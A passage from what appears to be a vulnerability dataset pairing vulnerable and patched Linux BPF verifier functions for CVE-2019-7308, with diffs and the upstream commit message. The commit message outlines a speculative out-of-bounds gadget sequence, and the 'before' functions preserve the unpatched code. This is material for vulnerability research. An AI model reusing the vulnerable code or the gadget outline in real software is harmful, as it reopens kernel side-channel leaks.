*/\n\t\t\terr = check_reg_arg(env, insn->dst_reg, SRC_OP);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t\tif (is_ctx_reg(env, insn->dst_reg)) {\n\t\t\t\tverbose(env, \"BPF_ST stores into R%d %s is not allowed\\n\",\n\t\t\t\t\tinsn->dst_reg,\n\t\t\t\t\treg_type_str[reg_state(env, insn->dst_reg)->type]);\n\t\t\t\treturn -EACCES;\n\t\t\t}\n\n\t\t\t/* check that memory (dst_reg + off) is writeable */\n\t\t\terr = check_mem_access(env, env->insn_idx, insn->dst_reg,\n\t\t\t\t\t       insn->off, BPF_SIZE(insn->code),\n\t\t\t\t\t       BPF_WRITE, -1, false);\n\t\t\tif (err)\n\t\t\t\treturn err;\n\n\t\t} else if (class == BPF_JMP) {\n\t\t\tu8 opcode = BPF_OP(insn->code);\n\n\t\t\tif (opcode == BPF_CALL) {\n\t\t\t\tif (BPF_SRC(insn->code) != BPF_K ||\n\t\t\t\t    insn->off != 0 ||\n\t\t\t\t    (insn->src_reg != BPF_REG_0 &&\n\t\t\t\t     insn->src_reg != BPF_PSEUDO_CALL) ||\n\t\t\t\t    insn->dst_reg != BPF_REG_0) {\n\t\t\t\t\tverbose(env, \"BPF_CALL uses reserved fields\\n\");\n\t\t\t\t\treturn -EINVAL;\n\t\t\t\t}\n\n\t\t\t\tif (insn->src_reg == BPF_PSEUDO_CALL)\n\t\t\t\t\terr = check_func_call(env, insn, &env->insn_idx);\n\t\t\t\telse\n\t\t\t\t\terr = check_helper_call(env, insn->imm, env->insn_idx);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\n\t\t\t} else if (opcode == BPF_JA) {\n\t\t\t\tif (BPF_SRC(insn->code) != BPF_K ||\n\t\t\t\t    insn->imm != 0 ||\n\t\t\t\t    insn->src_reg != BPF_REG_0 ||\n\t\t\t\t    insn->dst_reg != BPF_REG_0) {\n\t\t\t\t\tverbose(env, \"BPF_JA uses reserved fields\\n\");\n\t\t\t\t\treturn -EINVAL;\n\t\t\t\t}\n\n\t\t\t\tenv->insn_idx += insn->off + 1;\n\t\t\t\tcontinue;\n\n\t\t\t} else if (opcode == BPF_EXIT) {\n\t\t\t\tif (BPF_SRC(insn->code) != BPF_K ||\n\t\t\t\t    insn->imm != 0 ||\n\t\t\t\t    insn->src_reg != BPF_REG_0 ||\n\t\t\t\t    insn->dst_reg != BPF_REG_0) {\n\t\t\t\t\tverbose(env, \"BPF_EXIT uses reserved fields\\n\");\n\t\t\t\t\treturn -EINVAL;\n\t\t\t\t}\n\n\t\t\t\tif (state->curframe) {\n\t\t\t\t\t/* exit from nested function */\n\t\t\t\t\tenv->prev_insn_idx = env->insn_idx;\n\t\t\t\t\terr = prepare_func_exit(env, &env->insn_idx);\n\t\t\t\t\tif (err)\n\t\t\t\t\t\treturn err;\n\t\t\t\t\tdo_print_state = true;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\terr = check_reference_leak(env);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\n\t\t\t\t/* eBPF calling convetion is such that R0 is used\n\t\t\t\t * to return the value from eBPF program.\n\t\t\t\t * Make sure that it's readable at this time\n\t\t\t\t * of bpf_exit, which means that program wrote\n\t\t\t\t * something into it earlier\n\t\t\t\t */\n\t\t\t\terr = check_reg_arg(env, BPF_REG_0, SRC_OP);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\n\t\t\t\tif (is_pointer_value(env, BPF_REG_0)) {\n\t\t\t\t\tverbose(env, \"R0 leaks addr as return value\\n\");\n\t\t\t\t\treturn -EACCES;\n\t\t\t\t}\n\n\t\t\t\terr = check_return_code(env);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\nprocess_bpf_exit:\n\t\t\t\terr = pop_stack(env, &env->prev_insn_idx,\n\t\t\t\t\t\t&env->insn_idx);\n\t\t\t\tif (err < 0) {\n\t\t\t\t\tif (err != -ENOENT)\n\t\t\t\t\t\treturn err;\n\t\t\t\t\tbreak;\n\t\t\t\t} else {\n\t\t\t\t\tdo_print_state = true;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\terr = check_cond_jmp_op(env, insn, &env->insn_idx);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\t\t\t}\n\t\t} else if (class == BPF_LD) {\n\t\t\tu8 mode = BPF_MODE(insn->code);\n\n\t\t\tif (mode == BPF_ABS || mode == BPF_IND) {\n\t\t\t\terr = check_ld_abs(env, insn);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\n\t\t\t} else if (mode == BPF_IMM) {\n\t\t\t\terr = check_ld_imm(env, insn);\n\t\t\t\tif (err)\n\t\t\t\t\treturn err;\n\n\t\t\t\tenv->insn_idx++;\n\t\t\t\tenv->insn_aux_data[env->insn_idx].seen = true;\n\t\t\t} else {\n\t\t\t\tverbose(env, \"invalid BPF_LD mode\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t} else {\n\t\t\tverbose(env, \"unknown insn class %d\\n\", class);\n\t\t\treturn -EINVAL;\n\t\t}\n\n\t\tenv->insn_idx++;\n\t}\n\n\tverbose(env, \"processed %d insns (limit %d), stack depth \",\n\t\tinsn_processed, BPF_COMPLEXITY_LIMIT_INSNS);\n\tfor (i = 0; i < env->subprog_cnt; i++) {\n\t\tu32 depth = env->subprog_info[i].stack_depth;\n\n\t\tverbose(env, \"%d\", depth);\n\t\tif (i + 1 < env->subprog_cnt)\n\t\t\tverbose(env, \"+\");\n\t}\n\tverbose(env, \"\\n\");\n\tenv->prog->aux->stack_depth = env->subprog_info[0].stack_depth;\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -13,6 +13,7 @@\n \tif (!state)\n \t\treturn -ENOMEM;\n \tstate->curframe = 0;\n+\tstate->speculative = false;\n \tstate->frame[0] = kzalloc(sizeof(struct bpf_func_state), GFP_KERNEL);\n \tif (!state->frame[0]) {\n \t\tkfree(state);\n@@ -52,8 +53,10 @@\n \t\t\t/* found equivalent state, can prune the search */\n \t\t\tif (env->log.level) {\n \t\t\t\tif (do_print_state)\n-\t\t\t\t\tverbose(env, \"\\nfrom %d to %d: safe\\n\",\n-\t\t\t\t\t\tenv->prev_insn_idx, env->insn_idx);\n+\t\t\t\t\tverbose(env, \"\\nfrom %d to %d%s: safe\\n\",\n+\t\t\t\t\t\tenv->prev_insn_idx, env->insn_idx,\n+\t\t\t\t\t\tenv->cur_state->speculative ?\n+\t\t\t\t\t\t\" (speculative execution)\" : \"\");\n \t\t\t\telse\n \t\t\t\t\tverbose(env, \"%d: safe\\n\", env->insn_idx);\n \t\t\t}\n@@ -70,8 +73,10 @@\n \t\t\tif (env->log.level > 1)\n \t\t\t\tverbose(env, \"%d:\", env->insn_idx);\n \t\t\telse\n-\t\t\t\tverbose(env, \"\\nfrom %d to %d:\",\n-\t\t\t\t\tenv->prev_insn_idx, env->insn_idx);\n+\t\t\t\tverbose(env, \"\\nfrom %d to %d%s:\",\n+\t\t\t\t\tenv->prev_insn_idx, env->insn_idx,\n+\t\t\t\t\tenv->cur_state->speculative ?\n+\t\t\t\t\t\" (speculative execution)\" : \"\");\n \t\t\tprint_verifier_state(env, state->frame[state->curframe]);\n \t\t\tdo_print_state = false;\n \t\t}",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\t\t\tverbose(env, \"\\nfrom %d to %d: safe\\n\",",
                "\t\t\t\t\t\tenv->prev_insn_idx, env->insn_idx);",
                "\t\t\t\tverbose(env, \"\\nfrom %d to %d:\",",
                "\t\t\t\t\tenv->prev_insn_idx, env->insn_idx);"
            ],
            "added_lines": [
                "\tstate->speculative = false;",
                "\t\t\t\t\tverbose(env, \"\\nfrom %d to %d%s: safe\\n\",",
                "\t\t\t\t\t\tenv->prev_insn_idx, env->insn_idx,",
                "\t\t\t\t\t\tenv->cur_state->speculative ?",
                "\t\t\t\t\t\t\" (speculative execution)\" : \"\");",
                "\t\t\t\tverbose(env, \"\\nfrom %d to %d%s:\",",
                "\t\t\t\t\tenv->prev_insn_idx, env->insn_idx,",
                "\t\t\t\t\tenv->cur_state->speculative ?",
                "\t\t\t\t\t\" (speculative execution)\" : \"\");"
            ]
        }
    },
    {
        "cve_id": "CVE-2019-7308",
        "func_name": "torvalds/linux/check_cond_jmp_op",
        "description": "kernel/bpf/verifier.c in the Linux kernel before 4.20.6 performs undesirable out-of-bounds speculation on pointer arithmetic in various cases, including cases of different branches with different state or limits to sanitize, leading to side-channel attacks.",
        "git_url": "https://github.com/torvalds/linux/commit/979d63d50c0c0f7bc537bf821e056cc9fe5abd38",
        "commit_title": "bpf: prevent out of bounds speculation on pointer arithmetic",
        "commit_text": " Jann reported that the original commit back in b2157399cc98 (\"bpf: prevent out-of-bounds speculation\") was not sufficient to stop CPU from speculating out of bounds memory access: While b2157399cc98 only focussed on masking array map access for unprivileged users for tail calls and data access such that the user provided index gets sanitized from BPF program and syscall side, there is still a more generic form affected from BPF programs that applies to most maps that hold user data in relation to dynamic map access when dealing with unknown scalars or \"slow\" known scalars as access offset, for example:    - Load a map value pointer into R6   - Load an index into R7   - Do a slow computation (e.g. with a memory dependency) that     loads a limit into R8 (e.g. load the limit from a map for     high latency, then mask it to make the verifier happy)   - Exit if R7 >= R8 (mispredicted branch)   - Load R0 = R6[R7]   - Load R0 = R6[R0]  For unknown scalars there are two options in the BPF verifier where we could derive knowledge from in order to guarantee safe access to the memory: i) While </>/<=/>= variants won't allow to derive any lower or upper bounds from the unknown scalar where it would be safe to add it to the map value pointer, it is possible through ==/!= test however. ii) another option is to transform the unknown scalar into a known scalar, for example, through ALU ops combination such as R &= <imm> followed by R |= <imm> or any similar combination where the original information from the unknown scalar would be destroyed entirely leaving R with a constant. The initial slow load still precedes the latter ALU ops on that register, so the CPU executes speculatively from that point. Once we have the known scalar, any compare operation would work then. A third option only involving registers with known scalars could be crafted as described in [0] where a CPU port (e.g. Slow Int unit) would be filled with many dependent computations such that the subsequent condition depending on its outcome has to wait for evaluation on its execution port and thereby executing speculatively if the speculated code can be scheduled on a different execution port, or any other form of mistraining as described in [1], for example. Given this is not limited to only unknown scalars, not only map but also stack access is affected since both is accessible for unprivileged users and could potentially be used for out of bounds access under speculation.  In order to prevent any of these cases, the verifier is now sanitizing pointer arithmetic on the offset such that any out of bounds speculation would be masked in a way where the pointer arithmetic result in the destination register will stay unchanged, meaning offset masked into zero similar as in array_index_nospec() case. With regards to implementation, there are three options that were considered: i) new insn for sanitation, ii) push/pop insn and sanitation as inlined BPF, iii) reuse of ax register and sanitation as inlined BPF.  Option i) has the downside that we end up using from reserved bits in the opcode space, but also that we would require each JIT to emit masking as native arch opcodes meaning mitigation would have slow adoption till everyone implements it eventually which is counter-productive. Option ii) and iii) have both in common that a temporary register is needed in order to implement the sanitation as inlined BPF since we are not allowed to modify the source register. While a push / pop insn in ii) would be useful to have in any case, it requires once again that every JIT needs to implement it first. While possible, amount of changes needed would also be unsuitable for a -stable patch. Therefore, the path which has fewer changes, less BPF instructions for the mitigation and does not require anything to be changed in the JITs is option iii) which this work is pursuing. The ax register is already mapped to a register in all JITs (modulo arm32 where it's mapped to stack as various other BPF registers there) and used in constant blinding for JITs-only so far. It can be reused for verifier rewrites under certain constraints. The interpreter's tmp \"register\" has therefore been remapped into extending the register set with hidden ax register and reusing that for a number of instructions that needed the prior temporary variable internally (e.g. div, mod). This allows for zero increase in stack space usage in the interpreter, and enables (restricted) generic use in rewrites otherwise as long as such a patchlet does not make use of these instructions. The sanitation mask is dynamic and relative to the offset the map value or stack pointer currently holds.  There are various cases that need to be taken under consideration for the masking, e.g. such operation could look as follows: ptr += val or val += ptr or ptr -= val. Thus, the value to be sanitized could reside either in source or in destination register, and the limit is different depending on whether the ALU op is addition or subtraction and depending on the current known and bounded offset. The limit is derived as follows: limit := max_value_size - (smin_value + off). For subtraction: limit := umax_value + off. This holds because we do not allow any pointer arithmetic that would temporarily go out of bounds or would have an unknown value with mixed signed bounds where it is unclear at verification time whether the actual runtime value would be either negative or positive. For example, we have a derived map pointer value with constant offset and bounded one, so limit based on smin_value works because the verifier requires that statically analyzed arithmetic on the pointer must be in bounds, and thus it checks if resulting smin_value + off and umax_value + off is still within map value bounds at time of arithmetic in addition to time of access. Similarly, for the case of stack access we derive the limit as follows: MAX_BPF_STACK + off for subtraction and -off for the case of addition where off := ptr_reg->off + ptr_reg->var_off.value. Subtraction is a special case for the masking which can be in form of ptr += -val, ptr -= -val, or ptr -= val. In the first two cases where we know that the value is negative, we need to temporarily negate the value in order to do the sanitation on a positive value where we later swap the ALU op, and restore original source register if the value was in source.  The sanitation of pointer arithmetic alone is still not fully sufficient as is, since a scenario like the following could happen ...    PTR += 0x1000 (e.g. K-based imm)   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   PTR += 0x1000   PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON   [...]  ... which under speculation could end up as ...    PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   PTR += 0x1000   PTR -= 0 [ truncated by mitigation ]   [...]  ... and therefore still access out of bounds. To prevent such case, the verifier is also analyzing safety for potential out of bounds access under speculative execution. Meaning, it is also simulating pointer access under truncation. We therefore \"branch off\" and push the current verification state after the ALU operation with known 0 to the verification stack for later analysis. Given the current path analysis succeeded it is likely that the one under speculation can be pruned. In any case, it is also subject to existing complexity limits and therefore anything beyond this point will be rejected. In terms of pruning, it needs to be ensured that the verification state from speculative execution simulation must never prune a non-speculative execution path, therefore, we mark verifier state accordingly at the time of push_stack(). If verifier detects out of bounds access under speculative execution from one of the possible paths that includes a truncation, it will reject such program.  Given we mask every reg-based pointer arithmetic for unprivileged programs, we've been looking into how it could affect real-world programs in terms of size increase. As the majority of programs are targeted for privileged-only use case, we've unconditionally enabled masking (with its alu restrictions on top of it) for privileged programs for the sake of testing in order to check i) whether they get rejected in its current form, and ii) by how much the number of instructions and size will increase. We've tested this by using Katran, Cilium and test_l4lb from the kernel selftests. For Katran we've evaluated balancer_kern.o, Cilium bpf_lxc.o and an older test object bpf_lxc_opt_-DUNKNOWN.o and l4lb we've used test_l4lb.o as well as test_l4lb_noinline.o. We found that none of the programs got rejected by the verifier with this change, and that impact is rather minimal to none. balancer_kern.o had 13,904 bytes (1,738 insns) xlated and 7,797 bytes JITed before and after the change. Most complex program in bpf_lxc.o had 30,544 bytes (3,817 insns) xlated and 18,538 bytes JITed before and after and none of the other tail call programs in bpf_lxc.o had any changes either. For the older bpf_lxc_opt_-DUNKNOWN.o object we found a small increase from 20,616 bytes (2,576 insns) and 12,536 bytes JITed before to 20,664 bytes (2,582 insns) and 12,558 bytes JITed after the change. Other programs from that object file had similar small increase. Both test_l4lb.o had no change and remained at 6,544 bytes (817 insns) xlated and 3,401 bytes JITed and for test_l4lb_noinline.o constant at 5,080 bytes (634 insns) xlated and 3,313 bytes JITed. This can be explained in that LLVM typically optimizes stack based pointer arithmetic by using K-based operations and that use of dynamic map access is not overly frequent. However, in future we may decide to optimize the algorithm further under known guarantees from branch and value speculation. Latter seems also unclear in terms of prediction heuristics that today's CPUs apply as well as whether there could be collisions in e.g. the predictor's Value History/Pattern Table for triggering out of bounds access, thus masking is performed unconditionally at this point but could be subject to relaxation later on. We were generally also brainstorming various other approaches for mitigation, but the blocker was always lack of available registers at runtime and/or overhead for runtime tracking of limits belonging to a specific pointer. Thus, we found this to be minimally intrusive under given constraints.  With that in place, a simple example with sanitized access on unprivileged load at post-verification time looks as follows:    # bpftool prog dump xlated id 282   [...]   28: (79) r1 = *(u64 *)(r7 +0)   29: (79) r2 = *(u64 *)(r7 +8)   30: (57) r1 &= 15   31: (79) r3 = *(u64 *)(r0 +4608)   32: (57) r3 &= 1   33: (47) r3 |= 1   34: (2d) if r2 > r3 goto pc+19   35: (b4) (u32) r11 = (u32) 20479  |   36: (1f) r11 -= r2                | Dynamic sanitation for pointer   37: (4f) r11 |= r2                | arithmetic with registers   38: (87) r11 = -r11               | containing bounded or known   39: (c7) r11 s>>= 63              | scalars in order to prevent   40: (5f) r11 &= r2                | out of bounds speculation.   41: (0f) r4 += r11                |   42: (71) r4 = *(u8 *)(r4 +0)   43: (6f) r4 <<= r1   [...]  For the case where the scalar sits in the destination register as opposed to the source register, the following code is emitted for the above example:    [...]   16: (b4) (u32) r11 = (u32) 20479   17: (1f) r11 -= r2   18: (4f) r11 |= r2   19: (87) r11 = -r11   20: (c7) r11 s>>= 63   21: (5f) r2 &= r11   22: (0f) r2 += r0   23: (61) r0 = *(u32 *)(r2 +0)   [...]  JIT blinding example with non-conflicting use of r10:    [...]    d5:\tje     0x0000000000000106    _    d7:\tmov    0x0(%rax),%edi       |    da:\tmov    $0xf153246,%r10d     | Index load from map value and    e0:\txor    $0xf153259,%r10      | (const blinded) mask with 0x1f.    e7:\tand    %r10,%rdi            |_    ea:\tmov    $0x2f,%r10d          |    f0:\tsub    %rdi,%r10            | Sanitized addition. Both use r10    f3:\tor     %rdi,%r10            | but do not interfere with each    f6:\tneg    %r10                 | other. (Neither do these instructions    f9:\tsar    $0x3f,%r10           | interfere with the use of ax as temp    fd:\tand    %r10,%rdi            | in interpreter.)   100:\tadd    %rax,%rdi            |_   103:\tmov    0x0(%rdi),%eax  [...]  Tested that it fixes Jann's reproducer, and also checked that test_verifier and test_progs suite with interpreter, JIT and JIT with hardening enabled on x86-64 and arm64 runs successfully.    [0] Speculose: Analyzing the Security Implications of Speculative       Execution in CPUs, Giorgi Maisuradze and Christian Rossow,       https://arxiv.org/pdf/1801.04084.pdf    [1] A Systematic Evaluation of Transient Execution Attacks and       Defenses, Claudio Canella, Jo Van Bulck, Michael Schwarz,       Moritz Lipp, Benjamin von Berg, Philipp Ortner, Frank Piessens,       Dmitry Evtyushkin, Daniel Gruss,       https://arxiv.org/pdf/1811.05441.pdf ",
        "func_before": "static int check_cond_jmp_op(struct bpf_verifier_env *env,\n\t\t\t     struct bpf_insn *insn, int *insn_idx)\n{\n\tstruct bpf_verifier_state *this_branch = env->cur_state;\n\tstruct bpf_verifier_state *other_branch;\n\tstruct bpf_reg_state *regs = this_branch->frame[this_branch->curframe]->regs;\n\tstruct bpf_reg_state *dst_reg, *other_branch_regs;\n\tu8 opcode = BPF_OP(insn->code);\n\tint err;\n\n\tif (opcode > BPF_JSLE) {\n\t\tverbose(env, \"invalid BPF_JMP opcode %x\\n\", opcode);\n\t\treturn -EINVAL;\n\t}\n\n\tif (BPF_SRC(insn->code) == BPF_X) {\n\t\tif (insn->imm != 0) {\n\t\t\tverbose(env, \"BPF_JMP uses reserved fields\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\n\t\t/* check src1 operand */\n\t\terr = check_reg_arg(env, insn->src_reg, SRC_OP);\n\t\tif (err)\n\t\t\treturn err;\n\n\t\tif (is_pointer_value(env, insn->src_reg)) {\n\t\t\tverbose(env, \"R%d pointer comparison prohibited\\n\",\n\t\t\t\tinsn->src_reg);\n\t\t\treturn -EACCES;\n\t\t}\n\t} else {\n\t\tif (insn->src_reg != BPF_REG_0) {\n\t\t\tverbose(env, \"BPF_JMP uses reserved fields\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t}\n\n\t/* check src2 operand */\n\terr = check_reg_arg(env, insn->dst_reg, SRC_OP);\n\tif (err)\n\t\treturn err;\n\n\tdst_reg = &regs[insn->dst_reg];\n\n\tif (BPF_SRC(insn->code) == BPF_K) {\n\t\tint pred = is_branch_taken(dst_reg, insn->imm, opcode);\n\n\t\tif (pred == 1) {\n\t\t\t /* only follow the goto, ignore fall-through */\n\t\t\t*insn_idx += insn->off;\n\t\t\treturn 0;\n\t\t} else if (pred == 0) {\n\t\t\t/* only follow fall-through branch, since\n\t\t\t * that's where the program will go\n\t\t\t */\n\t\t\treturn 0;\n\t\t}\n\t}\n\n\tother_branch = push_stack(env, *insn_idx + insn->off + 1, *insn_idx);\n\tif (!other_branch)\n\t\treturn -EFAULT;\n\tother_branch_regs = other_branch->frame[other_branch->curframe]->regs;\n\n\t/* detect if we are comparing against a constant value so we can adjust\n\t * our min/max values for our dst register.\n\t * this is only legit if both are scalars (or pointers to the same\n\t * object, I suppose, but we don't support that right now), because\n\t * otherwise the different base pointers mean the offsets aren't\n\t * comparable.\n\t */\n\tif (BPF_SRC(insn->code) == BPF_X) {\n\t\tif (dst_reg->type == SCALAR_VALUE &&\n\t\t    regs[insn->src_reg].type == SCALAR_VALUE) {\n\t\t\tif (tnum_is_const(regs[insn->src_reg].var_off))\n\t\t\t\treg_set_min_max(&other_branch_regs[insn->dst_reg],\n\t\t\t\t\t\tdst_reg, regs[insn->src_reg].var_off.value,\n\t\t\t\t\t\topcode);\n\t\t\telse if (tnum_is_const(dst_reg->var_off))\n\t\t\t\treg_set_min_max_inv(&other_branch_regs[insn->src_reg],\n\t\t\t\t\t\t    &regs[insn->src_reg],\n\t\t\t\t\t\t    dst_reg->var_off.value, opcode);\n\t\t\telse if (opcode == BPF_JEQ || opcode == BPF_JNE)\n\t\t\t\t/* Comparing for equality, we can combine knowledge */\n\t\t\t\treg_combine_min_max(&other_branch_regs[insn->src_reg],\n\t\t\t\t\t\t    &other_branch_regs[insn->dst_reg],\n\t\t\t\t\t\t    &regs[insn->src_reg],\n\t\t\t\t\t\t    &regs[insn->dst_reg], opcode);\n\t\t}\n\t} else if (dst_reg->type == SCALAR_VALUE) {\n\t\treg_set_min_max(&other_branch_regs[insn->dst_reg],\n\t\t\t\t\tdst_reg, insn->imm, opcode);\n\t}\n\n\t/* detect if R == 0 where R is returned from bpf_map_lookup_elem() */\n\tif (BPF_SRC(insn->code) == BPF_K &&\n\t    insn->imm == 0 && (opcode == BPF_JEQ || opcode == BPF_JNE) &&\n\t    reg_type_may_be_null(dst_reg->type)) {\n\t\t/* Mark all identical registers in each branch as either\n\t\t * safe or unknown depending R == 0 or R != 0 conditional.\n\t\t */\n\t\tmark_ptr_or_null_regs(this_branch, insn->dst_reg,\n\t\t\t\t      opcode == BPF_JNE);\n\t\tmark_ptr_or_null_regs(other_branch, insn->dst_reg,\n\t\t\t\t      opcode == BPF_JEQ);\n\t} else if (!try_match_pkt_pointers(insn, dst_reg, &regs[insn->src_reg],\n\t\t\t\t\t   this_branch, other_branch) &&\n\t\t   is_pointer_value(env, insn->dst_reg)) {\n\t\tverbose(env, \"R%d pointer comparison prohibited\\n\",\n\t\t\tinsn->dst_reg);\n\t\treturn -EACCES;\n\t}\n\tif (env->log.level)\n\t\tprint_verifier_state(env, this_branch->frame[this_branch->curframe]);\n\treturn 0;\n}",
        "func": "static int check_cond_jmp_op(struct bpf_verifier_env *env,\n\t\t\t     struct bpf_insn *insn, int *insn_idx)\n{\n\tstruct bpf_verifier_state *this_branch = env->cur_state;\n\tstruct bpf_verifier_state *other_branch;\n\tstruct bpf_reg_state *regs = this_branch->frame[this_branch->curframe]->regs;\n\tstruct bpf_reg_state *dst_reg, *other_branch_regs;\n\tu8 opcode = BPF_OP(insn->code);\n\tint err;\n\n\tif (opcode > BPF_JSLE) {\n\t\tverbose(env, \"invalid BPF_JMP opcode %x\\n\", opcode);\n\t\treturn -EINVAL;\n\t}\n\n\tif (BPF_SRC(insn->code) == BPF_X) {\n\t\tif (insn->imm != 0) {\n\t\t\tverbose(env, \"BPF_JMP uses reserved fields\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\n\t\t/* check src1 operand */\n\t\terr = check_reg_arg(env, insn->src_reg, SRC_OP);\n\t\tif (err)\n\t\t\treturn err;\n\n\t\tif (is_pointer_value(env, insn->src_reg)) {\n\t\t\tverbose(env, \"R%d pointer comparison prohibited\\n\",\n\t\t\t\tinsn->src_reg);\n\t\t\treturn -EACCES;\n\t\t}\n\t} else {\n\t\tif (insn->src_reg != BPF_REG_0) {\n\t\t\tverbose(env, \"BPF_JMP uses reserved fields\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t}\n\n\t/* check src2 operand */\n\terr = check_reg_arg(env, insn->dst_reg, SRC_OP);\n\tif (err)\n\t\treturn err;\n\n\tdst_reg = &regs[insn->dst_reg];\n\n\tif (BPF_SRC(insn->code) == BPF_K) {\n\t\tint pred = is_branch_taken(dst_reg, insn->imm, opcode);\n\n\t\tif (pred == 1) {\n\t\t\t /* only follow the goto, ignore fall-through */\n\t\t\t*insn_idx += insn->off;\n\t\t\treturn 0;\n\t\t} else if (pred == 0) {\n\t\t\t/* only follow fall-through branch, since\n\t\t\t * that's where the program will go\n\t\t\t */\n\t\t\treturn 0;\n\t\t}\n\t}\n\n\tother_branch = push_stack(env, *insn_idx + insn->off + 1, *insn_idx,\n\t\t\t\t  false);\n\tif (!other_branch)\n\t\treturn -EFAULT;\n\tother_branch_regs = other_branch->frame[other_branch->curframe]->regs;\n\n\t/* detect if we are comparing against a constant value so we can adjust\n\t * our min/max values for our dst register.\n\t * this is only legit if both are scalars (or pointers to the same\n\t * object, I suppose, but we don't support that right now), because\n\t * otherwise the different base pointers mean the offsets aren't\n\t * comparable.\n\t */\n\tif (BPF_SRC(insn->code) == BPF_X) {\n\t\tif (dst_reg->type == SCALAR_VALUE &&\n\t\t    regs[insn->src_reg].type == SCALAR_VALUE) {\n\t\t\tif (tnum_is_const(regs[insn->src_reg].var_off))\n\t\t\t\treg_set_min_max(&other_branch_regs[insn->dst_reg],\n\t\t\t\t\t\tdst_reg, regs[insn->src_reg].var_off.value,\n\t\t\t\t\t\topcode);\n\t\t\telse if (tnum_is_const(dst_reg->var_off))\n\t\t\t\treg_set_min_max_inv(&other_branch_regs[insn->src_reg],\n\t\t\t\t\t\t    &regs[insn->src_reg],\n\t\t\t\t\t\t    dst_reg->var_off.value, opcode);\n\t\t\telse if (opcode == BPF_JEQ || opcode == BPF_JNE)\n\t\t\t\t/* Comparing for equality, we can combine knowledge */\n\t\t\t\treg_combine_min_max(&other_branch_regs[insn->src_reg],\n\t\t\t\t\t\t    &other_branch_regs[insn->dst_reg],\n\t\t\t\t\t\t    &regs[insn->src_reg],\n\t\t\t\t\t\t    &regs[insn->dst_reg], opcode);\n\t\t}\n\t} else if (dst_reg->type == SCALAR_VALUE) {\n\t\treg_set_min_max(&other_branch_regs[insn->dst_reg],\n\t\t\t\t\tdst_reg, insn->imm, opcode);\n\t}\n\n\t/* detect if R == 0 where R is returned from bpf_map_lookup_elem() */\n\tif (BPF_SRC(insn->code) == BPF_K &&\n\t    insn->imm == 0 && (opcode == BPF_JEQ || opcode == BPF_JNE) &&\n\t    reg_type_may_be_null(dst_reg->type)) {\n\t\t/* Mark all identical registers in each branch as either\n\t\t * safe or unknown depending R == 0 or R != 0 conditional.\n\t\t */\n\t\tmark_ptr_or_null_regs(this_branch, insn->dst_reg,\n\t\t\t\t      opcode == BPF_JNE);\n\t\tmark_ptr_or_null_regs(other_branch, insn->dst_reg,\n\t\t\t\t      opcode == BPF_JEQ);\n\t} else if (!try_match_pkt_pointers(insn, dst_reg, &regs[insn->src_reg],\n\t\t\t\t\t   this_branch, other_branch) &&\n\t\t   is_pointer_value(env, insn->dst_reg)) {\n\t\tverbose(env, \"R%d pointer comparison prohibited\\n\",\n\t\t\tinsn->dst_reg);\n\t\treturn -EACCES;\n\t}\n\tif (env->log.level)\n\t\tprint_verifier_state(env, this_branch->frame[this_branch->curframe]);\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -58,7 +58,8 @@\n \t\t}\n \t}\n \n-\tother_branch = push_stack(env, *insn_idx + insn->off + 1, *insn_idx);\n+\tother_branch = push_stack(env, *insn_idx + insn->off + 1, *insn_idx,\n+\t\t\t\t  false);\n \tif (!other_branch)\n \t\treturn -EFAULT;\n \tother_branch_regs = other_branch->frame[other_branch->curframe]->regs;",
        "diff_line_info": {
            "deleted_lines": [
                "\tother_branch = push_stack(env, *insn_idx + insn->off + 1, *insn_idx);"
            ],
            "added_lines": [
                "\tother_branch = push_stack(env, *insn_idx + insn->off + 1, *insn_idx,",
                "\t\t\t\t  false);"
            ]
        }
    },
    {
        "cve_id": "CVE-2019-7308",
        "func_name": "torvalds/linux/copy_verifier_state",
        "description": "kernel/bpf/verifier.c in the Linux kernel before 4.20.6 performs undesirable out-of-bounds speculation on pointer arithmetic in various cases, including cases of different branches with different state or limits to sanitize, leading to side-channel attacks.",
        "git_url": "https://github.com/torvalds/linux/commit/979d63d50c0c0f7bc537bf821e056cc9fe5abd38",
        "commit_title": "bpf: prevent out of bounds speculation on pointer arithmetic",
        "commit_text": " Jann reported that the original commit back in b2157399cc98 (\"bpf: prevent out-of-bounds speculation\") was not sufficient to stop CPU from speculating out of bounds memory access: While b2157399cc98 only focussed on masking array map access for unprivileged users for tail calls and data access such that the user provided index gets sanitized from BPF program and syscall side, there is still a more generic form affected from BPF programs that applies to most maps that hold user data in relation to dynamic map access when dealing with unknown scalars or \"slow\" known scalars as access offset, for example:    - Load a map value pointer into R6   - Load an index into R7   - Do a slow computation (e.g. with a memory dependency) that     loads a limit into R8 (e.g. load the limit from a map for     high latency, then mask it to make the verifier happy)   - Exit if R7 >= R8 (mispredicted branch)   - Load R0 = R6[R7]   - Load R0 = R6[R0]  For unknown scalars there are two options in the BPF verifier where we could derive knowledge from in order to guarantee safe access to the memory: i) While </>/<=/>= variants won't allow to derive any lower or upper bounds from the unknown scalar where it would be safe to add it to the map value pointer, it is possible through ==/!= test however. ii) another option is to transform the unknown scalar into a known scalar, for example, through ALU ops combination such as R &= <imm> followed by R |= <imm> or any similar combination where the original information from the unknown scalar would be destroyed entirely leaving R with a constant. The initial slow load still precedes the latter ALU ops on that register, so the CPU executes speculatively from that point. Once we have the known scalar, any compare operation would work then. A third option only involving registers with known scalars could be crafted as described in [0] where a CPU 